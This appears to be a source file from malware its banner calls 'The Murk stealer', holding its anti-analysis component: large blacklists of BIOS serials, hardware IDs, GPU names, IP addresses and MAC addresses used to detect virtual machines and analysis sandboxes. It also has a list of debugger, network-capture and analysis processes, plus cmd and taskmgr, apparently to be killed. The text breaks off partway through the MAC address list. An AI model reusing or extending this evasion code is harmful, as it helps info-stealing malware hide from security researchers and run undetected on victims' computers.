#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
from subprocess import check_output, PIPE
import psutil
import uuid
import wmi
import subprocess
import requests
import platform
import json



blacklisted_Bios = ['1111-2222-3333-4444-5555-6666-77', '23N3POYYY1', '3198-9985-5799-7712-2227-9299-33', '91o2Vzn', 'BVE12AKCEN', 'G8RSDBDNAE', 'H8EDC23SF3', 'nebwazhere-33461537510662145672765213630', 'S215027X9C26307', 'XT6AC1LSV7', 'F2050F0', 'A1B7R1ZEOG', 'QQQ978886578', 'S215027X9C26348', 'YYSTYVFWKS', 'C4TV6M26H9', 'S215027X9C26320', 'ASTIBZI', 'O58YKASVDF', '4HPAOU8EFS', '7Z7YWZGY1O', 'S215027X0421568', 'GWSESTVRYZ', '8966-6471-0414-5159-3855-4982-24', 'XAXOXCE8BK', '9O2WNWVP6M', '9QJZLY49', '2HZW8GMKZX', '5YLKP33LS6', 'FR2PNHNUM9', '4BWNP53ZYP', 'MF6CZOFL']

blacklisted_Manufacture = ['ASUSTeK Computer Inc.', ' Dell Inc.', ' Microsoft Corporation', ' nebwazhere-33461537510662145672765213630', ' Oracle Corporation', ' R5H7R4S3OL', ' UFU9G5U1VL', ' X7GYTD2PKH', ' ZH24B4O9K6', ' ', ' G31UHK6XGS', ' Supermicro', ' ATFTPBZWYL', ' 7VOMLW7PUX', ' 4PR61MC4SC', ' MH4NDNH3C6', ' 8KBCLP6AC4', ' 89254YMATF', ' SK1YOPWFXV', ' FA4KL3X3DG', ' Gumstix', ' Sapphire Technology', ' S2SHWDMD19', ' CMU6TC3EPZ', ' SSH2Z5OX4K']

blacklisted_BaseBoard = ['0', '0936857067238931', '1111-2222-3333-4444-5555-6666-77', '1982146386385341', '2747959269666226', '3198-9985-5799-7712-2227-9299-33', '6763600828589702', '7125360206537298', 'nebwazhere-341296874984313456826628', 'ZD192S000813', '7D4B67276A58480C8', '6011411254185724', 'QQQQQQQ978886578', 'ZD192S001109', '4818215228163524', '3345771688717745', '5769118809068676', '1914014226551656', '7852388990144422', 'WD201S000104', 'ZD192S000915', '8167610923259059', '8966-6471-0414-5159-3855-4982-24', '8679625164016616', '2068114050712741', 'QILB1AZI1', 'YY1COIU6S6', '4790421453068944', '8068495691790338', '5220475704923916', 'JW8SGQN72']

blacklisted_CPU = ['nebwazhere-34129687498431345682662821879', 'None', 'To Be Filled By O.E.M.', '0']

blacklisted_Drive = ['0', 'beaf1211', 'beaf2081', 'QM00013', 'VB9b31f9ac-5dd7d509', 'VBb6525b74-1a30b936', 'beaf1351', '1-0000:00:05.0-1', 'beaf1391', 'beaf1491', 'beaf2071', 'QM00001']

blacklisted_HW_Profile_GUID = ['f8ede335-1f00-11e7-8eb1-806e6f6e6963', 'd27478a5-2058-11e8-b41f-806e6f6e6963', '3882a840-858a-11eb-b9e1-806e6f6e6963', '271621c0-58dd-11ea-a7c9-806e6f6e6963', 'a936735f-15c6-11ed-be09-806e6f6e6963', '6bb4f034-2706-11e5-9bbe-806e6f6e6963', '3882a840-858a-11eb-b9e1-806e6f6e6963', '271621c0-58dd-11ea-a7c9-806e6f6e6963', '64f224c0-8b62-11ed-9690-806e6f6e6963', '3bfe7b3d-9546-11ea-a261-806e6f6e6963', '6bb4f034-2706-11e5-9bbe-806e6f6e6963', '3882a840-858a-11eb-b9e1-806e6f6e6963', 'da43251e-b4c7-11e9-a255-806e6f6e6963', '271621c0-58dd-11ea-a7c9-806e6f6e6963', '6edb8408-d3ee-11e7-ae97-806e6f6e6963', '64f224c0-8b62-11ed-9690-806e6f6e6963', '6caee1a8-b190-11ed-8e2c-806e6f6e6963', '2cb30fc0-76a4-11ed-8717-806e6f6e6963', '978b386a-bef5-11ed-a2b7-806e6f6e6963', '3882a840-858a-11eb-b9e1-806e6f6e6963', 'da43251e-b4c7-11e9-a255-806e6f6e6963', '64f224c0-8b62-11ed-9690-806e6f6e6963', 'f8ede335-1f00-11e7-8eb1-806e6f6e6963']

blacklisted_Machine_GUID = ['cbbb49d6-b7ff-44ca-aba5-8a5e250d4d42', 'a3d27cfa-1e7a-4ff8-8004-2be13417b6b1', 'c784477d-3fc3-4206-9876-55a4df3943da', '2b5365f1-eebb-4135-b6e1-413aab299fcb', 'cdbd2082-8cfa-481b-ad9b-fc08276e590d', '4508afd3-5f05-491e-b49f-b44024967766', '089e621c-1422-4856-a8b1-3f1db208ce9e', '15947802-cb9c-478f-af5c-33b1abbd1bfe', '5c5926b0-d06a-4688-ade2-325cbb39b4fc', '801de7cf-3111-46e2-946b-65e7431dc386', '', '081ab395-5e85-4634-acdb-2dbd4f59a7d0', '453b8045-4cab-4c86-866a-4118a8ac4db6', 'fb31a63b-dc7c-49d2-8f59-4a30a2594045', '10797f1d-9613-4832-b1a3-c22fe365b89d', '9083fa32-68f2-4dff-a60e-e076f7aeabd3', '6c5fe7fc-a9c6-46cd-baea-529d2dedc1df', '6a94764b-5e0f-42cf-8947-df4b99cb5cf1']

blacklisted_Processes = ['httpdebuggerui', 'wireshark', 'fiddler', 'regedit', 'vboxservice', 'df5serv', 'processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver']

kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

blacklisted_GPU = ['29__HERE', '2RO_8UVU', '5KBK41_L', '5LXPA8ES', '5PECN6L1', '5RPFT3HZ', '6BOS4O7U', '6BZP2Y2_', '7229H9G9', '7TB9G6P7', '84KD1KSK', '8NYGK3FL', '8Y3BSXKG', '9SF72FG7', '9Z77DN4T', 'AMDRadeonHD8650G', 'ASPEEDGraphicsFamily(WDDM)', 'BDMD4C14', 'CSUZOOXW', 'CWTM14GS', 'D6XUO1XB', 'DE92L2UN', 'DFXWTBCX', 'ET1BXXAK', 'F1K792VR', 'H1_SDVLF', 'HKWURZU9', 'HP8WD3MX', 'H_EDEUEK', 'Intel(R)HDGraphics4600', 'K9SC88UK', 'KBBFOHZN', 'KOD68ZH1', 'KW5PTYKC', 'LD8LLLOD', 'M5RGU9RY', 'MDF5Z6ZO', 'MicrosoftBasicDisplayAdapter', 'MicrosoftHyper-VVideo', 'MicrosoftRemoteDisplayAdapter', 'MKVW6M6X', 'MTSUP2DX', 'MYNP2R7E', 'NVIDIAGeForce840M', 'NVIDIAGeForce9400M', 'NVIDIAGeForce9500GT(MicrosoftCorporation-WDDMv1.1)', 'O597EOTS', 'OEFUG1_W', 'OOUT3ENP', 'OYVM_U6G', 'P9T_AU3X', 'PC1ESCG3', 'R69XK_H3', 'Radeon(TM)RX580Graphics', 'StandardVGAGraphicsAdapter', 'UKBEHH_S', 'VirtualDesktopMonitor', 'VirtualBoxGraphicsAdapter', 'VirtualBoxGraphicsAdapter(WDDM)', 'VMwareSVGA3D', 'VO5V631D', 'W1TO6L3T', 'W29FK1O1', 'X4R9RZ5L', 'XMX85CAL', 'YANBV9OY', 'YNVLCUKZ', 'YVK4794D', 'Z2P8CT__', 'ZN_TF2UZ', 'ZP62XCAP', '_G31E46N', '_PHLNYGR', '_T9W5LHO', 'СтандартныйVGAграфическийадаптер', '6F44ADR7', 'VM64TTFX', 'WKMZ6LN2', '2SN538K4', '2G6C7Z61', 'S6DZU3GA', '74ZZCY7A', 'HASZN_3F', 'X5ZW15TV', 'HV61HV5F', 'TTXRONXD', 'AFRBR6TC']

blacklisted_HWID = ['00000000-0000-0000-0000-000000000000', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD047A0', '00000000-0000-0000-0000-AC1F6BD04850', '00000000-0000-0000-0000-AC1F6BD048D6', '00000000-0000-0000-0000-AC1F6BD048DC', '00000000-0000-0000-0000-AC1F6BD048F8', '00000000-0000-0000-0000-AC1F6BD048FE', '00000000-0000-0000-0000-AC1F6BD04900', '00000000-0000-0000-0000-AC1F6BD0491C', '00000000-0000-0000-0000-AC1F6BD04926', '00000000-0000-0000-0000-AC1F6BD04928', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-AC1F6BD04976', '00000000-0000-0000-0000-AC1F6BD04978', '00000000-0000-0000-0000-AC1F6BD04986', '00000000-0000-0000-0000-AC1F6BD049B8', '00000000-0000-0000-0000-AC1F6BD04C0A', '00000000-0000-0000-0000-AC1F6BD04D06', '00000000-0000-0000-0000-AC1F6BD04D08', '00000000-0000-0000-0000-AC1F6BD04D8E', '00000000-0000-0000-0000-AC1F6BD04D98', '00000000-0000-0000-0000-AC1F6BD04DC0', '00000000-0000-0000-0000-AC1F6BD04DCC', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', '032E02B4-0499-05C3-0806-3C0700080009', '03AA02FC-0414-0507-BC06-D70700080009', '03D40274-0435-05BF-D906-D20700080009', '03DE0294-0480-05DE-1A06-350700080009', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '05790C00-3B21-11EA-8000-3CECEF4400D0', '0700BEF3-1410-4284-81B1-E5C17FA9E18F', '07AF2042-392C-229F-8491-455123CC85FB', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '0910CBA3-B396-476B-A7D7-716DB90F5FB9', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '0A36B1E3-1F6B-47DE-8D72-D4F46927F13F', '0A9D60D4-9A32-4317-B7C0-B11B5C677335', '0D748400-3B00-11EA-8000-3CECEF44007E', '0F377508-5106-45F4-A0D6-E8352F51A8A5', '104F9B96-5B46-4567-BF56-0066C1C6F7F0', '11111111-2222-3333-4444-555555555555', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '138D921D-680F-4145-BDFF-EC463E70C77D', '13A61742-AF45-EFE4-70F4-05EF50767784', '14692042-A78B-9563-D59D-EB7DD2639037', '1AAD2042-66E8-C06A-2F81-A6A4A6A99093', '1B5D3FFD-A28E-4F11-9CD6-FF148989548C', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', '213D2878-0E33-4D8C-B0D1-31425B9DE674', '222EFE91-EAE3-49F1-8E8D-EBAE067F801A', '26645000-3B67-11EA-8000-3CECEF440124', '2AB86800-3C50-11EA-8000-3CECEF440130', '2C5C2E42-E7B1-4D75-3EA3-A325353CDB72', '2CEA2042-9B9B-FAC1-44D8-159FE611FCCC', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '2F94221A-9D07-40D9-8C98-87CB5BFC3549', '2FBC3342-6152-674F-08E4-227A81CBD5F5', '34419E14-4019-11EB-9A22-6C4AB634B69A', '361E3342-9FAD-AC1C-F1AD-02E97892270F', '365B4000-3B25-11EA-8000-3CECEF44010C', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '38AB3342-66B0-7175-0B23-F390B3728B78', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', '3EDC0561-C455-4D64-B176-3CFBBBF3FA47', '3F284CA4-8BDF-489B-A273-41B44D668F6D', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', '3FADD8D6-3754-47C4-9BFF-0E35553DD5FB', '40384E87-1FBA-4096-9EA1-D110F0EA92A8', '40F100F9-401C-487D-8D37-48107C6CE1D3', '418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED', '41B73342-8EA1-E6BF-ECB0-4BC8768D86E9', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '44B94D56-65AB-DC02-86A0-98143A7423BF', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '481E2042-A1AF-D390-CE06-A8F783B1E76A', '48941AE9-D52F-11DF-BBDA-503734826431', '49434D53-0200-9036-2500-369025000C65', '49434D53-0200-9036-2500-369025003865', '49434D53-0200-9036-2500-369025003A65', '49434D53-0200-9036-2500-369025003AF0', '49434D53-0200-9036-2500-369025005CF0', '49434D53-0200-9036-2500-36902500F022', '49434D53-0200-9065-2500-659025002274', '49434D53-0200-9065-2500-659025005073', '49434D53-0200-9065-2500-659025008074', '49434D53-0200-9065-2500-65902500E439', '499B0800-3C18-11EA-8000-3CECEF43FEA4', '4C4C4544-0050-3710-8058-CAC04F59344A', '4CB82042-BA8F-1748-C941-363C391CA7F3', '4CE94980-D7DA-11DD-A621-08606E889D9B', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '4DC32042-E601-F329-21C1-03F27564FD6C', '4EDF3342-E7A2-5776-4AE5-57531F471D56', '51646514-93E1-4CB6-AF29-036B45D14CBF', '52A1C000-3BAB-11EA-8000-3CECEF440204', '56B9F600-3C1C-11EA-8000-3CECEF4401DE', '59C68035-4B21-43E8-A6A6-BD734C0EE699', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6', '5CC7016D-76AB-492D-B178-44C12B1B3C73', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '5E573342-6093-4F2D-5F78-F51B9822B388', '5EBC5C00-3B70-11EA-8000-3CECEF4401DA', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '60C83342-0A97-928D-7316-5F1080A78E72', '612F079A-D69B-47EA-B7FF-13839CD17404', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '63DE70B4-1905-48F2-8CC4-F7C13B578B34', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '64176F5E-8F74-412F-B3CF-917EFA5FB9DB', '6608003F-ECE4-494E-B07E-1C4615D1D93C', '66729280-2B0C-4BD0-8131-950D86871E54', '66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B', '671BC5F7-4B0F-FF43-B923-8B1645581DC8', '67442042-0F69-367D-1B2E-1EE846020090', '67C5A563-3218-4718-8251-F38E3F6A89C1', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', '686D4936-87C1-4EBD-BEB7-B3D92ECA4E28', '6881083C-EE5A-43E7-B7E3-A0CE9227839C', '69AEA650-3AE3-455C-9F80-51159BAE5EAE', '6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3', '6AA13342-49AB-DC46-4F28-D7BDDCE6BE32', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', '71522042-DA0B-6793-668B-CE95AEA7FE21', '72492D47-52EF-427A-B623-D4F2192F97D4', '73163342-B704-86D5-519B-18E1D191335C', '777D84B3-88D1-451C-93E4-D235177420A7', '782ED390-AE10-4727-A866-07018A8DED22', '79AF5279-16CF-4094-9758-F88A616D81B4', '7A484800-3B19-11EA-8000-3CECEF440122', '7AB5C494-39F5-4941-9163-47F54D6D5016', '7CA33342-A88C-7CD1-1ABB-7C0A82F488BF', '7D341C16-E8E9-42EA-8779-93653D877231', '7D6A0A6D-394E-4179-9636-662A8D2C7304', '7E4755A6-7160-4982-8F5D-6AA481749F10', '80152042-2F34-11D1-441F-5FADCA01996D', '83BFD600-3C27-11EA-8000-3CECEF4400B4', '844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6', '84782042-E646-50A0-159F-A8E75D4F9402', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 
'84FEEFBC-805F-4C0E-AD5B-A0042999134D', '8703841B-3C5E-461C-BE72-1747D651CE89', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '8DA62042-8B59-B4E3-D232-38B29A10964A', '8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', '90A83342-D7E7-7A14-FFB3-2AA345FDBC89', '91625303-5211-4AAC-9842-01A41BA60D5A', '91A9EEDB-4652-4453-AC5B-8E92E68CBCF5', '921E2042-70D3-F9F1-8CBD-B398A21F89C6', '94515D88-D62B-498A-BA7C-3614B5D4307C', '95BF6A00-3C63-11EA-8000-3CECEF43FEB8', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '9921DE3A-5C1A-DF11-9078-563412000026', '9B2F7E00-6F4C-11EA-8000-3CECEF467028', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '9FC997CA-5081-4751-BC78-CE56D06F6A62', 'A100EFD7-4A31-458F-B7FE-2EF95162B32F', 'A15A930C-8251-9645-AF63-E45AD728C20C', 'A19323DA-80B2-48C9-9F8F-B21D08C3FE07', 'A1A849F7-0D57-4AD3-9073-C79D274EECC8', 'A2339E80-BB69-4BF5-84BC-E9BE9D574A65', 'A5CE2042-8D25-24C4-71F7-F56309D7D45F', 'A6A21742-8023-CED9-EA8D-8F0BC4B35DEA', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'AAFC2042-4721-4E22-F795-A60296CAC029', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'B1112042-52E8-E25B-3655-6A4F54155DBF', 'B22B623B-6B62-4F9B-A9D3-94A15453CEF4', 'B5B77895-D40B-4F30-A565-6EF72586A14A', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'B9DA2042-0D7B-F938-8E8A-DA098462AAEC', 'BB233342-2E01-718F-D4A1-E7F69D026428', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'BFE62042-E4E1-0B20-6076-C5D83EDFAFCE', 'C0342042-AF96-18EE-C570-A5EFA8FF8890', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E', 'C51E9A00-3BC3-11EA-8000-3CECEF440034', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', 'C9283342-8499-721F-12BE-32A556C9A7A8', 'CC4AB400-3C66-11EA-8000-3CECEF43FE56', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', 'CD74107E-444E-11EB-BA3A-E3FDD4B29537', 'CE352E42-9339-8484-293A-BD50CDC639A5', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'D4260370-C9F1-4195-95A8-585611AE73F2', 'D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB', 'D5DD3342-46B5-298A-2E81-5CA6867168BE', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', 'D7958D98-A51E-4B34-8C51-547A6C2E6615', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'DD45F600-3C63-11EA-8000-3CECEF440156', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', 'E08DE9AA-C704-4261-B32D-57B2A3993518', 'E0C806ED-B25A-4744-AD7D-59771187122E', 'E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5', 'E2342042-A1F8-3DCF-0182-0E63D607BCC7', 'E3BB3342-02A8-5613-9C92-3747616194FD', 'E57F6333-A2AC-4F65-B442-20E928C0A625', 'E67640B3-2B34-4D7F-BD62-59A1822DDBDC', 'E6DBCCDF-5082-4479-B61A-6990D92ACC5F', 'E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'F3EA4E00-3C5F-11EA-8000-3CECEF440016', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'F5BB1742-D36D-A11E-6580-2EA2427B0038', 'F5EFEEAC-96A0-11EB-8365-FAFE299935A9', 'F68B2042-E3A7-2ADA-ADBC-A6274307A317', 'F705420F-0BB3-4688-B75C-6CD1352CABA9', 'F91C9458-6656-4E83-B84A-13641DE92949', 'F9E41000-3B35-11EA-8000-3CECEF440150', 'FA612E42-DC79-4F91-CA17-1538AD635C95', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'FBC62042-5DE9-16AD-3F27-F818E5F68DD3', 'FC40ACF8-DD97-4590-B605-83B595B0C4BA', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', 'FED63342-E0D6-C669-D53F-253D696D74DA', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '9CFF2042-2043-0340-4F9C-4BAE6DC5BB39', 'D7AC2042-05F8-0037-54A6-38387D00B767', '52562042-B33F-C9D3-0149-241F40A0F5D8', '3E9AC505-812A-456F-A9E6-C7426582500E', '11E12042-2404-040A-31E4-27374099F748', '6E963342-B9C8-2D14-B057-C60C35722AD4', '9EB0FAF6-0713-4576-BD64-813DEE9E477E', '0B8A2042-2E8E-BECC-B6A4-7925F2163DC9', '89E32042-1B2B-5C76-E966-D4E363846FD4', '699400A5-AFC6-427A-A56F-CE63D3E121CB', '2F230ED7-5797-4DB2-BAA0-99A193503E4B', '3A512042-7806-4187-C90D-DA6925F74D0F', '074B2042-8EF0-B1EA-B32B-DEDCD4CED0D8', 'B381F3F2-BEDC-4B70-B80A-1B6AF4977159', '61961742-17FF-666B-F694-764F63BDC370', 'AC222042-0B1A-9043-5AFC-69883F2FE55D', 'A4C82042-B56D-E950-B8C4-E4FF9378B252']

blacklisted_ip = ['10.200.169.204', '104.198.155.173', '109.145.173.169', '109.226.37.172', '109.74.154.90', '109.74.154.91', '109.74.154.92', '154.61.71.50', '154.61.71.51', '174.7.32.199', '176.63.4.179', '178.239.165.70', '188.105.165.80', '188.105.71.44', '188.105.91.116', '188.105.91.143', '188.105.91.173', '192.211.110.74', '192.40.57.234', '192.87.28.103', '193.128.114.45', '193.225.193.201', '194.154.78.152', '194.154.78.160', '194.154.78.210', '194.154.78.227', '194.154.78.230', '194.154.78.77', '194.186.142.178', '194.186.142.204', '195.181.175.103', '195.181.175.105', '195.239.51.3', '195.239.51.46', '195.239.51.59', '195.239.51.65', '195.239.51.80', '195.68.142.3', '195.74.76.222', '20.99.160.173', '204.101.161.31', '204.101.161.32', '207.102.138.83', '207.102.138.93', '208.78.41.115', '212.119.227.151', '212.119.227.167', '212.119.227.179', '212.119.227.184', '212.41.6.23', '213.33.142.50', '213.33.190.118', '213.33.190.171', '213.33.190.22', '213.33.190.227', '213.33.190.35', '213.33.190.46', '213.33.190.74', '23.128.248.46', '34.105.0.27', '34.105.183.68', '34.105.72.241', '34.138.96.23', '34.141.146.114', '34.141.245.25', '34.142.74.220', '34.145.195.58', '34.145.89.174', '34.253.248.228', '34.83.46.130', '34.85.243.241', '34.85.253.170', '35.192.93.107', '35.199.6.13', '35.229.69.227', '35.237.47.12', '45.8.148.171', '64.124.12.162', '67.218.111.202', '78.139.8.50', '79.104.209.109', '79.104.209.231', '79.104.209.24', '79.104.209.249', '79.104.209.33', '79.104.209.66', '80.211.0.97', '84.147.54.113', '84.147.54.61', '84.147.56.249', '84.147.60.41', '84.147.60.52', '84.147.61.28', '84.147.62.12', '84.147.63.171', '84.147.63.236', '87.166.48.65', '87.166.50.1', '87.166.50.213', '87.166.51.209', '88.132.225.100', '88.132.226.203', '88.132.227.238', '88.132.231.71', '88.153.199.169', '88.64.35.141', '88.66.107.75', '88.67.131.90', '88.86.117.130', '89.208.29.106', '89.208.29.140', '89.208.29.149', '89.208.29.64', '92.211.109.160', '92.211.192.144', '92.211.52.62', '92.211.55.199', '93.216.75.209', '95.25.204.90', '95.25.71.12', '95.25.71.5', '95.25.71.64', '95.25.71.70', '95.25.71.86', '95.25.71.89', '95.25.81.24', 'None', '84.57.200.69', '194.154.78.179', '213.33.190.242', '89.208.29.95', '95.25.71.65', '194.186.142.246', '213.33.190.42', '89.208.29.96', '89.208.29.97', '195.68.142.20', '79.104.209.221', '95.25.71.80', '194.186.142.180', '195.239.51.42', '79.104.209.172', '194.186.142.195', '194.154.78.91', '89.208.29.98', '95.25.71.92', '212.119.227.136', '95.25.71.112', '88.64.36.101', '213.33.190.109', '89.208.29.108', '194.186.142.236', '194.186.142.183', '95.25.71.87', '88.66.8.175', '213.33.190.69', '194.186.142.214', '79.104.209.36', '195.239.51.89', '172.105.89.202', '194.154.78.144', '194.154.78.169', '52.250.30.131']

blacklisted_Mac_Address = ['00:03:47:1a:f1:f1', '00:03:47:20:57:7a', '00:03:47:5d:92:c5', '00:03:47:63:8b:de', '00:03:47:8d:a9:5d', '00:0c:29:05:d8:6e', '00:0c:29:2c:c1:21', '00:0c:29:52:52:50', '00:0d:3a:d2:4f:1f', '00:15:5d:00:00:1d', '00:15:5d:00:00:a4', '00:15:5d:00:00:b3', '00:15:5d:00:00:c3', '00:15:5d:00:00:f3', '00:15:5d:00:01:81', '00:15:5d:00:02:26', '00:15:5d:00:05:8d', '00:15:5d:00:05:d5', '00:15:5d:00:06:43', '00:15:5d:00:07:34', '00:15:5d:00:1a:b9', '00:15:5d:00:1c:9a', '00:15:5d:00:26:02', '00:15:5d:13:66:ca', '00:15:5d:13:6d:0c', '00:15:5d:1e:01:c8', '00:15:5d:23:4c:a3', '00:15:5d:23:4c:ad', '00:15:5d:b6:e0:cc', '00:1b:21:13:15:20', '00:1b:21:13:21:26', '00:1b:21:13:26:44', '00:1b:21:13:32:20', '00:1b:21:13:32:51', '00:1b:21:13:33:55', '00:23:cd:ff:94:f0', '00:25:90:36:65:0c', '00:25:90:36:65:38', '00:25:90:36:65:3a', '00:25:90:36:65:3b', '00:25:90:36:f0:3b', '00:25:90:65:39:e4', '00:50:56:97:6f:1e', '00:50:56:97:a1:f8', '00:50:56:97:bd:d0', '00:50:56:97:e7:6a', '00:50:56:97:ec:f2', '00:50:56:97:f6:c8', '00:50:56:a0:06:8d', '00:50:56:a0:2d:30', '00:50:56:a0:38:06', '00:50:56:a0:39:18', '00:50:56:a0:45:03', '00:50:56:a0:59:10', '00:50:56:a0:61:aa', '00:50:56:a0:6d:86', '00:50:56:a0:74:6c', '00:50:56:a0:84:88', '00:50:56:a0:88:4c', '00:50:56:a0:99:b6', '00:50:56:a0:9d:9b', '00:50:56:a0:a9:54', '00:50:56:a0:aa:80', '00:50:56:a0:af:75', '00:50:56:a0:bc:9a', '00:50:56:a0:c8:20', '00:50:56:a0:cd:a8', '00:50:56:a0:d0:fa', '00:50:56:a0:d7:38', '00:50:56:a0:dd:00', '00:50:56:a0:f7:ff', '00:50:56:a0:fb:0a', '00:50:56:ae:34:c9', '00:50:56:ae:5d:ea', '00:50:56:ae:64:fc', '00:50:56:ae:6f:54', '00:50:56:ae:70:80', '00:50:56:ae:b2:b0', '00:50:56:ae:e5:d5', '00:50:56:b3:05:b4', '00:50:56:b3:05:e7', '00:50:56:b3:09:25', '00:50:56:b3:09:9e', '00:50:56:b3:10:a9', '00:50:56:b3:14:59', '00:50:56:b3:21:29', '00:50:56:b3:38:68', '00:50:56:b3:38:88', '00:50:56:b3:3b:a6', '00:50:56:b3:42:33', '00:50:56:b3:4c:bf', '00:50:56:b3:50:de', '00:50:56:b3:55:58', '00:50:56:b3:70:7a', '00:50:56:b3:73:78', '00:50:56:b3:79:92', '00:50:56:b3:91:c8', '00:50:56:b3:94:cb', '00:50:56:b3:9e:9e', '00:50:56:b3:a5:6f', '00:50:56:b3:a9:36', '00:50:56:b3:c5:4d', '00:50:56:b3:d0:a7', '00:50:56:b3:dd:03', '00:50:56:b3:ea:ee', '00:50:56:b3:ee:e1', '00:50:56:b3:f6:57', '00:50:56:b3:fa:23', '00:90:0b:c8:39:23', '00:90:0b:c8:39:2a', '00:90:0b:c8:39:3c', '00:90:0b:c8:39:3d', '00:90:0b:c8:39:4d', '00:e0:4c:06:6b:2c', '00:e0:4c:13:f6:ef', '00:e0:4c:20:57:30', '00:e0:4c:2f:16:3f', '00:e0:4c:33:b1:a9', '00:e0:4c:39:76:1e', '00:e0:4c:3f:0b:76', '00:e0:4c:42:c7:cb', '00:e0:4c:44:76:54', '00:e0:4c:46:04:ea', 